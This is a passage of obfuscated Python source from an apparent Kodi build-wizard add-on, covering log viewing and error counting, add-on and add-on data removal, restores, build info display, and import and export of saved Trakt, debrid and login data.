		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO0OO0OO00O0OOO0O )#line:4102
		O0O0OOOO00000O000 =OO0OO0OO00O0OOO0O .split ('/')#line:4103
		if len (O0O0OOOO00000O000 [-1 ])>5 :#line:4104
			OO0OO0OO00O0OOO0O =O0O0OOOO00000O000 [-1 ]#line:4105
		elif len (O0O0OOOO00000O000 [-2 ])>5 :#line:4106
			OO0OO0OO00O0OOO0O =O0O0OOOO00000O000 [-2 ]#line:4107
	wiz .log ("YouTube URL: %s"%OO0OO0OO00O0OOO0O )#line:4108
	yt .PlayVideo (OO0OO0OO00O0OOO0O )#line:4109
def viewLogFile ():#line:4111
	OOO0O00OOOOO0O0OO =wiz .Grab_Log (True )#line:4112
	OO0O00000OO0OOO0O =wiz .Grab_Log (True ,True )#line:4113
	O0O0000O0OO0OOOO0 =0 ;OOOOOO0OOOO00OO00 =OOO0O00OOOOO0O0OO #line:4114
	if not OO0O00000OO0OOO0O ==False and not OOO0O00OOOOO0O0OO ==False :#line:4115
		O0O0000O0OO0OOOO0 =DIALOG .select (ADDONTITLE ,["View %s"%OOO0O00OOOOO0O0OO .replace (LOG ,""),"View %s"%OO0O00000OO0OOO0O .replace (LOG ,"")])#line:4116
		if O0O0000O0OO0OOOO0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4117
	elif OOO0O00OOOOO0O0OO ==False and OO0O00000OO0OOO0O ==False :#line:4118
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4119
		return #line:4120
	elif not OOO0O00OOOOO0O0OO ==False :O0O0000O0OO0OOOO0 =0 #line:4121
	elif not OO0O00000OO0OOO0O ==False :O0O0000O0OO0OOOO0 =1 #line:4122
	OOOOOO0OOOO00OO00 =OOO0O00OOOOO0O0OO if O0O0000O0OO0OOOO0 ==0 else OO0O00000OO0OOO0O #line:4124
	O0O0000OO0OO000OO =wiz .Grab_Log (False )if O0O0000O0OO0OOOO0 ==0 else wiz .Grab_Log (False ,True )#line:4125
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OOOOOO0OOOO00OO00 ),O0O0000OO0OO000OO )#line:4127
def errorChecking (log =None ,count =None ,all =None ):#line:4129
	if log ==None :#line:4130
		O00O0O0OOOOO00OO0 =wiz .Grab_Log (True )#line:4131
		O0OOO0000O0OOOOOO =wiz .Grab_Log (True ,True )#line:4132
		if not O0OOO0000O0OOOOOO ==False and not O00O0O0OOOOO00OO0 ==False :#line:4133
			OOO0OO0OOOO00O000 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O00O0O0OOOOO00OO0 .replace (LOG ,""),errorChecking (O00O0O0OOOOO00OO0 ,True ,True )),"View %s: %s error(s)"%(O0OOO0000O0OOOOOO .replace (LOG ,""),errorChecking (O0OOO0000O0OOOOOO ,True ,True ))])#line:4134
			if OOO0OO0OOOO00O000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4135
		elif O00O0O0OOOOO00OO0 ==False and O0OOO0000O0OOOOOO ==False :#line:4136
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4137
			return #line:4138
		elif not O00O0O0OOOOO00OO0 ==False :OOO0OO0OOOO00O000 =0 #line:4139
		elif not O0OOO0000O0OOOOOO ==False :OOO0OO0OOOO00O000 =1 #line:4140
		log =O00O0O0OOOOO00OO0 if OOO0OO0OOOO00O000 ==0 else O0OOO0000O0OOOOOO #line:4141
	if log ==False :#line:4142
		if count ==None :#line:4143
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4144
			return False #line:4145
		else :#line:4146
			return 0 #line:4147
	else :#line:4148
		if os .path .exists (log ):#line:4149
			O0OOOO00O0O0O0OO0 =open (log ,mode ='r');O00OOOO0O0O0OO0OO =O0OOOO00O0O0O0OO0 .read ().replace ('\n','').replace ('\r','');O0OOOO00O0O0O0OO0 .close ()#line:4150
			O000OOO0O0OOOO000 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O00OOOO0O0O0OO0OO )#line:4151
			if not count ==None :#line:4152
				if all ==None :#line:4153
					O00000000O0OO000O =0 #line:4154
					for O0OO0000O0OOO0OOO in O000OOO0O0OOOO000 :#line:4155
						if ADDON_ID in O0OO0000O0OOO0OOO :O00000000O0OO000O +=1 #line:4156
					return O00000000O0OO000O #line:4157
				else :return len (O000OOO0O0OOOO000 )#line:4158
			if len (O000OOO0O0OOOO000 )>0 :#line:4159
				O00000000O0OO000O =0 ;OO0OOOO0000OOOO00 =""#line:4160
				for O0OO0000O0OOO0OOO in O000OOO0O0OOOO000 :#line:4161
					if all ==None and not ADDON_ID in O0OO0000O0OOO0OOO :continue #line:4162
					else :#line:4163
						O00000000O0OO000O +=1 #line:4164
						OO0OOOO0000OOOO00 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O00000000O0OO000O ,O0OO0000O0OOO0OOO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4165
				if O00000000O0OO000O >0 :#line:4166
					wiz .TextBox (ADDONTITLE ,OO0OOOO0000OOOO00 )#line:4167
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4168
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4169
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4170
ACTION_PREVIOUS_MENU =10 #line:4172
ACTION_NAV_BACK =92 #line:4173
ACTION_MOVE_LEFT =1 #line:4174
ACTION_MOVE_RIGHT =2 #line:4175
ACTION_MOVE_UP =3 #line:4176
ACTION_MOVE_DOWN =4 #line:4177
ACTION_MOUSE_WHEEL_UP =104 #line:4178
ACTION_MOUSE_WHEEL_DOWN =105 #line:4179
ACTION_MOVE_MOUSE =107 #line:4180
ACTION_SELECT_ITEM =7 #line:4181
ACTION_BACKSPACE =110 #line:4182
ACTION_MOUSE_LEFT_CLICK =100 #line:4183
ACTION_MOUSE_LONG_CLICK =108 #line:4184
def LogViewer (default =None ):#line:4186
	class OOOOOO0OOO00OO000 (xbmcgui .WindowXMLDialog ):#line:4187
		def __init__ (OO0O00O000O00O00O ,*OOOOO0O000000OOO0 ,**O0O0OOO00000000OO ):#line:4188
			OO0O00O000O00O00O .default =O0O0OOO00000000OO ['default']#line:4189
		def onInit (OOOOO00O0OO0OO0O0 ):#line:4191
			OOOOO00O0OO0OO0O0 .title =101 #line:4192
			OOOOO00O0OO0OO0O0 .msg =102 #line:4193
			OOOOO00O0OO0OO0O0 .scrollbar =103 #line:4194
			OOOOO00O0OO0OO0O0 .upload =201 #line:4195
			OOOOO00O0OO0OO0O0 .kodi =202 #line:4196
			OOOOO00O0OO0OO0O0 .kodiold =203 #line:4197
			OOOOO00O0OO0OO0O0 .wizard =204 #line:4198
			OOOOO00O0OO0OO0O0 .okbutton =205 #line:4199
			O00OOO00OOOO0OO00 =open (OOOOO00O0OO0OO0O0 .default ,'r')#line:4200
			OOOOO00O0OO0OO0O0 .logmsg =O00OOO00OOOO0OO00 .read ()#line:4201
			O00OOO00OOOO0OO00 .close ()#line:4202
			OOOOO00O0OO0OO0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOOO00O0OO0OO0O0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4203
			OOOOO00O0OO0OO0O0 .showdialog ()#line:4204
		def showdialog (OO000OO0OOO0O0O00 ):#line:4206
			OO000OO0OOO0O0O00 .getControl (OO000OO0OOO0O0O00 .title ).setLabel (OO000OO0OOO0O0O00 .titlemsg )#line:4207
			OO000OO0OOO0O0O00 .getControl (OO000OO0OOO0O0O00 .msg ).setText (wiz .highlightText (OO000OO0OOO0O0O00 .logmsg ))#line:4208
			OO000OO0OOO0O0O00 .setFocusId (OO000OO0OOO0O0O00 .scrollbar )#line:4209
		def onClick (O0O0O0000O00OO0OO ,OOO0O0OO0OOOO0OOO ):#line:4211
			if OOO0O0OO0OOOO0OOO ==O0O0O0000O00OO0OO .okbutton :O0O0O0000O00OO0OO .close ()#line:4212
			elif OOO0O0OO0OOOO0OOO ==O0O0O0000O00OO0OO .upload :O0O0O0000O00OO0OO .close ();uploadLog .Main ()#line:4213
			elif OOO0O0OO0OOOO0OOO ==O0O0O0000O00OO0OO .kodi :#line:4214
				O0OOOOO0000OO00OO =wiz .Grab_Log (False )#line:4215
				O0OOO0OOO00OOOOOO =wiz .Grab_Log (True )#line:4216
				if O0OOOOO0000OO00OO ==False :#line:4217
					O0O0O0000O00OO0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4218
					O0O0O0000O00OO0OO .getControl (O0O0O0000O00OO0OO .msg ).setText ("Log File Does Not Exists!")#line:4219
				else :#line:4220
					O0O0O0000O00OO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O0OOO0OOO00OOOOOO .replace (LOG ,''))#line:4221
					O0O0O0000O00OO0OO .getControl (O0O0O0000O00OO0OO .title ).setLabel (O0O0O0000O00OO0OO .titlemsg )#line:4222
					O0O0O0000O00OO0OO .getControl (O0O0O0000O00OO0OO .msg ).setText (wiz .highlightText (O0OOOOO0000OO00OO ))#line:4223
					O0O0O0000O00OO0OO .setFocusId (O0O0O0000O00OO0OO .scrollbar )#line:4224
			elif OOO0O0OO0OOOO0OOO ==O0O0O0000O00OO0OO .kodiold :#line:4225
				O0OOOOO0000OO00OO =wiz .Grab_Log (False ,True )#line:4226
				O0OOO0OOO00OOOOOO =wiz .Grab_Log (True ,True )#line:4227
				if O0OOOOO0000OO00OO ==False :#line:4228
					O0O0O0000O00OO0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4229
					O0O0O0000O00OO0OO .getControl (O0O0O0000O00OO0OO .msg ).setText ("Log File Does Not Exists!")#line:4230
				else :#line:4231
					O0O0O0000O00OO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O0OOO0OOO00OOOOOO .replace (LOG ,''))#line:4232
					O0O0O0000O00OO0OO .getControl (O0O0O0000O00OO0OO .title ).setLabel (O0O0O0000O00OO0OO .titlemsg )#line:4233
					O0O0O0000O00OO0OO .getControl (O0O0O0000O00OO0OO .msg ).setText (wiz .highlightText (O0OOOOO0000OO00OO ))#line:4234
					O0O0O0000O00OO0OO .setFocusId (O0O0O0000O00OO0OO .scrollbar )#line:4235
			elif OOO0O0OO0OOOO0OOO ==O0O0O0000O00OO0OO .wizard :#line:4236
				O0OOOOO0000OO00OO =wiz .Grab_Log (False ,False ,True )#line:4237
				O0OOO0OOO00OOOOOO =wiz .Grab_Log (True ,False ,True )#line:4238
				if O0OOOOO0000OO00OO ==False :#line:4239
					O0O0O0000O00OO0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4240
					O0O0O0000O00OO0OO .getControl (O0O0O0000O00OO0OO .msg ).setText ("Log File Does Not Exists!")#line:4241
				else :#line:4242
					O0O0O0000O00OO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O0OOO0OOO00OOOOOO .replace (ADDONDATA ,''))#line:4243
					O0O0O0000O00OO0OO .getControl (O0O0O0000O00OO0OO .title ).setLabel (O0O0O0000O00OO0OO .titlemsg )#line:4244
					O0O0O0000O00OO0OO .getControl (O0O0O0000O00OO0OO .msg ).setText (wiz .highlightText (O0OOOOO0000OO00OO ))#line:4245
					O0O0O0000O00OO0OO .setFocusId (O0O0O0000O00OO0OO .scrollbar )#line:4246
		def onAction (OOOOO00OOO00OO00O ,O0O00O0O0O0O0O0OO ):#line:4248
			if O0O00O0O0O0O0O0OO ==ACTION_PREVIOUS_MENU :OOOOO00OOO00OO00O .close ()#line:4249
			elif O0O00O0O0O0O0O0OO ==ACTION_NAV_BACK :OOOOO00OOO00OO00O .close ()#line:4250
	if default ==None :default =wiz .Grab_Log (True )#line:4251
	OO0O00OO0OO0OOO00 =OOOOOO0OOO00OO000 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4252
	OO0O00OO0OO0OOO00 .doModal ()#line:4253
	del OO0O00OO0OO0OOO00 #line:4254
def removeAddon (O0OO0OO00OO000000 ,O0O00000OO000OO00 ,over =False ):#line:4256
	if not over ==False :#line:4257
		O0O0O0OO0OO0OO000 =1 #line:4258
	else :#line:4259
		O0O0O0OO0OO0OO000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O00000OO000OO00 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0OO0OO00OO000000 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4260
	if O0O0O0OO0OO0OO000 ==1 :#line:4261
		O0O0O00OOOO00O0O0 =os .path .join (ADDONS ,O0OO0OO00OO000000 )#line:4262
		wiz .log ("Removing Addon %s"%O0OO0OO00OO000000 )#line:4263
		wiz .cleanHouse (O0O0O00OOOO00O0O0 )#line:4264
		xbmc .sleep (1000 )#line:4265
		try :shutil .rmtree (O0O0O00OOOO00O0O0 )#line:4266
		except Exception as O0O00OOOO0O0OOO0O :wiz .log ("Error removing %s"%O0OO0OO00OO000000 ,xbmc .LOGNOTICE )#line:4267
		removeAddonData (O0OO0OO00OO000000 ,O0O00000OO000OO00 ,over )#line:4268
	if over ==False :#line:4269
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0O00000OO000OO00 ))#line:4270
def removeAddonData (OOO000000OO0O0OO0 ,name =None ,over =False ):#line:4272
	if OOO000000OO0O0OO0 =='all':#line:4273
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4274
			wiz .cleanHouse (ADDOND )#line:4275
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4276
	elif OOO000000OO0O0OO0 =='uninstalled':#line:4277
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4278
			OO0OO000O0000OO00 =0 #line:4279
			for O00O00O0OO00000OO in glob .glob (os .path .join (ADDOND ,'*')):#line:4280
				O0O00O00O0000OOO0 =O00O00O0OO00000OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4281
				if O0O00O00O0000OOO0 in EXCLUDES :pass #line:4282
				elif os .path .exists (os .path .join (ADDONS ,O0O00O00O0000OOO0 )):pass #line:4283
				else :wiz .cleanHouse (O00O00O0OO00000OO );OO0OO000O0000OO00 +=1 ;wiz .log (O00O00O0OO00000OO );shutil .rmtree (O00O00O0OO00000OO )#line:4284
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OO000O0000OO00 ))#line:4285
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4286
	elif OOO000000OO0O0OO0 =='empty':#line:4287
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4288
			OO0OO000O0000OO00 =wiz .emptyfolder (ADDOND )#line:4289
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0OO000O0000OO00 ))#line:4290
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4291
	else :#line:4292
		OO0O000O00000O0O0 =os .path .join (USERDATA ,'addon_data',OOO000000OO0O0OO0 )#line:4293
		if OOO000000OO0O0OO0 in EXCLUDES :#line:4294
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4295
		elif os .path .exists (OO0O000O00000O0O0 ):#line:4296
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO000000OO0O0OO0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4297
				wiz .cleanHouse (OO0O000O00000O0O0 )#line:4298
				try :#line:4299
					shutil .rmtree (OO0O000O00000O0O0 )#line:4300
				except :#line:4301
					wiz .log ("Error deleting: %s"%OO0O000O00000O0O0 )#line:4302
			else :#line:4303
				wiz .log ('Addon data for %s was not removed'%OOO000000OO0O0OO0 )#line:4304
	wiz .refresh ()#line:4305
def restoreit (OO0OOO000O0O00000 ):#line:4307
	if OO0OOO000O0O00000 =='build':#line:4308
		OO00O0O00OOOO0O0O =freshStart ('restore')#line:4309
		if OO00O0O00OOOO0O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4310
	if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary']:#line:4311
		wiz .skinToDefault ()#line:4312
	wiz .restoreLocal (OO0OOO000O0O00000 )#line:4313
def restoreextit (O0OO00OO0O0O0OO00 ):#line:4315
	if O0OO00OO0O0O0OO00 =='build':#line:4316
		OO0OO00O00O0000OO =freshStart ('restore')#line:4317
		if OO0OO00O00O0000OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4318
	wiz .restoreExternal (O0OO00OO0O0O0OO00 )#line:4319
def buildInfo (O000O00O00O00OO00 ):#line:4321
	if wiz .workingURL (SPEEDFILE )==True :#line:4322
		if wiz .checkBuild (O000O00O00O00OO00 ,'url'):#line:4323
			O000O00O00O00OO00 ,OO0O00O0OO000OO00 ,O00OO00O0O00000OO ,O000O0O00OOOO00OO ,OO0OO00O0000OOOOO ,O00O00O0O0O0O00O0 ,OOO0000O0O0000000 ,OO0OO0O000O0000OO ,OO0OOO0O00000O00O ,O00OOO00OOOOO0000 ,OOOO0OO00OO000O00 =wiz .checkBuild (O000O00O00O00OO00 ,'all')#line:4324
			O00OOO00OOOOO0000 ='Yes'if O00OOO00OOOOO0000 .lower ()=='yes'else 'No'#line:4325
			OO0O000OOO0000O00 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000O00O00O00OO00 )#line:4326
			OO0O000OOO0000O00 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O00O0OO000OO00 )#line:4327
			if not O00O00O0O0O0O00O0 =="http://":#line:4328
				OO00OO0O00O0OOOO0 =wiz .themeCount (O000O00O00O00OO00 ,False )#line:4329
				OO0O000OOO0000O00 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO00OO0O00O0OOOO0 ))#line:4330
			OO0O000OOO0000O00 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0OO00O0000OOOOO )#line:4331
			OO0O000OOO0000O00 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OOO00OOOOO0000 )#line:4332
			OO0O000OOO0000O00 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO0OO00OO000O00 )#line:4333
			wiz .TextBox (ADDONTITLE ,OO0O000OOO0000O00 )#line:4334
		else :wiz .log ("Invalid Build Name!")#line:4335
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4336
def buildVideo (OOO00O0O00OO0000O ):#line:4338
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4339
	if wiz .workingURL (SPEEDFILE )==True :#line:4340
		O0OO00OO00O0O0OOO =wiz .checkBuild (OOO00O0O00OO0000O ,'preview')#line:4341
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOO00O0O00OO0000O )#line:4342
		if O0OO00OO00O0O0OOO and not O0OO00OO00O0O0OOO =='http://':playVideo (O0OO00OO00O0O0OOO )#line:4343
		else :wiz .log ("[%s]Unable to find url for video preview"%OOO00O0O00OO0000O )#line:4344
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4345
def dependsList (O000OO0O0OO00OO0O ):#line:4347
	OOOO00O000000OO0O =os .path .join (ADDONS ,O000OO0O0OO00OO0O ,'addon.xml')#line:4348
	if os .path .exists (OOOO00O000000OO0O ):#line:4349
		OO0O00OO00000O000 =open (OOOO00O000000OO0O ,mode ='r');O0OOOOO00OOO0O00O =OO0O00OO00000O000 .read ();OO0O00OO00000O000 .close ();#line:4350
		O000OO0OO00OOO00O =wiz .parseDOM (O0OOOOO00OOO0O00O ,'import',ret ='addon')#line:4351
		OOOO00O00O0O00OO0 =[]#line:4352
		for OOOOOOOO0O000O0OO in O000OO0OO00OOO00O :#line:4353
			if not 'xbmc.python'in OOOOOOOO0O000O0OO :#line:4354
				OOOO00O00O0O00OO0 .append (OOOOOOOO0O000O0OO )#line:4355
		return OOOO00O00O0O00OO0 #line:4356
	return []#line:4357
def manageSaveData (OO0O0000O0O00O00O ):#line:4359
	if OO0O0000O0O00O00O =='import':#line:4360
		O00O0OOOOO00OO000 =os .path .join (ADDONDATA ,'temp')#line:4361
		if not os .path .exists (O00O0OOOOO00OO000 ):os .makedirs (O00O0OOOOO00OO000 )#line:4362
		O0OO0OOOO0O0O00O0 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4363
		if not O0OO0OOOO0O0O00O0 .endswith ('.zip'):#line:4364
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4365
			return #line:4366
		OOOO00O00OO0OOOO0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4367
		OO00O0O0O00O0OO00 =xbmcvfs .copy (O0OO0OOOO0O0O00O0 ,OOOO00O00OO0OOOO0 )#line:4368
		wiz .log ("%s"%str (OO00O0O0O00O0OO00 ))#line:4369
		extract .all (xbmc .translatePath (OOOO00O00OO0OOOO0 ),O00O0OOOOO00OO000 )#line:4370
		OOO0O0O00000OO0O0 =os .path .join (O00O0OOOOO00OO000 ,'trakt')#line:4371
		O000000000OOOO0OO =os .path .join (O00O0OOOOO00OO000 ,'login')#line:4372
		OOO0OOO0O0OO0O0OO =os .path .join (O00O0OOOOO00OO000 ,'debrid')#line:4373
		O00O00O000000OOO0 =0 #line:4374
		if os .path .exists (OOO0O0O00000OO0O0 ):#line:4375
			O00O00O000000OOO0 +=1 #line:4376
			O00O00000OOO00OO0 =os .listdir (OOO0O0O00000OO0O0 )#line:4377
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4378
			for OOOO0O0000O00O000 in O00O00000OOO00OO0 :#line:4379
				O00000O000O0OOO00 =os .path .join (traktit .TRAKTFOLD ,OOOO0O0000O00O000 )#line:4380
				O00000OO00O0OOO00 =os .path .join (OOO0O0O00000OO0O0 ,OOOO0O0000O00O000 )#line:4381
				if os .path .exists (O00000O000O0OOO00 ):#line:4382
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOO0O0000O00O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4383
					else :os .remove (O00000O000O0OOO00 )#line:4384
				shutil .copy (O00000OO00O0OOO00 ,O00000O000O0OOO00 )#line:4385
			traktit .importlist ('all')#line:4386
			traktit .traktIt ('restore','all')#line:4387
		if os .path .exists (O000000000OOOO0OO ):#line:4388
			O00O00O000000OOO0 +=1 #line:4389
			O00O00000OOO00OO0 =os .listdir (O000000000OOOO0OO )#line:4390
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4391
			for OOOO0O0000O00O000 in O00O00000OOO00OO0 :#line:4392
				O00000O000O0OOO00 =os .path .join (loginit .LOGINFOLD ,OOOO0O0000O00O000 )#line:4393
				O00000OO00O0OOO00 =os .path .join (O000000000OOOO0OO ,OOOO0O0000O00O000 )#line:4394
				if os .path .exists (O00000O000O0OOO00 ):#line:4395
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOO0O0000O00O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4396
					else :os .remove (O00000O000O0OOO00 )#line:4397
				shutil .copy (O00000OO00O0OOO00 ,O00000O000O0OOO00 )#line:4398
			loginit .importlist ('all')#line:4399
			loginit .loginIt ('restore','all')#line:4400
		if os .path .exists (OOO0OOO0O0OO0O0OO ):#line:4401
			O00O00O000000OOO0 +=1 #line:4402
			O00O00000OOO00OO0 =os .listdir (OOO0OOO0O0OO0O0OO )#line:4403
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4404
			for OOOO0O0000O00O000 in O00O00000OOO00OO0 :#line:4405
				O00000O000O0OOO00 =os .path .join (debridit .REALFOLD ,OOOO0O0000O00O000 )#line:4406
				O00000OO00O0OOO00 =os .path .join (OOO0OOO0O0OO0O0OO ,OOOO0O0000O00O000 )#line:4407
				if os .path .exists (O00000O000O0OOO00 ):#line:4408
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOO0O0000O00O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4409
					else :os .remove (O00000O000O0OOO00 )#line:4410
				shutil .copy (O00000OO00O0OOO00 ,O00000O000O0OOO00 )#line:4411
			debridit .importlist ('all')#line:4412
			debridit .debridIt ('restore','all')#line:4413
		wiz .cleanHouse (O00O0OOOOO00OO000 )#line:4414
		wiz .removeFolder (O00O0OOOOO00OO000 )#line:4415
		os .remove (OOOO00O00OO0OOOO0 )#line:4416
		if O00O00O000000OOO0 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4417
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4418
	elif OO0O0000O0O00O00O =='export':#line:4419
		OOO00OO000OOOO00O =xbmc .translatePath (MYBUILDS )#line:4420
		OO0O000O00000OO0O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4421
		traktit .traktIt ('update','all')#line:4422
		loginit .loginIt ('update','all')#line:4423
		debridit .debridIt ('update','all')#line:4424
		O0OO0OOOO0O0O00O0 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4425
		O0OO0OOOO0O0O00O0 =xbmc .translatePath (O0OO0OOOO0O0O00O0 )#line:4426
		OOO0OO0OOOO0OOO00 =os .path .join (OOO00OO000OOOO00O ,'SaveData.zip')#line:4427
		O0O0O00OOO00O000O =zipfile .ZipFile (OOO0OO0OOOO0OOO00 ,mode ='w')#line:4428
		for O0000O0OOOOOO0OOO in OO0O000O00000OO0O :#line:4429
			if os .path .exists (O0000O0OOOOOO0OOO ):#line:4430
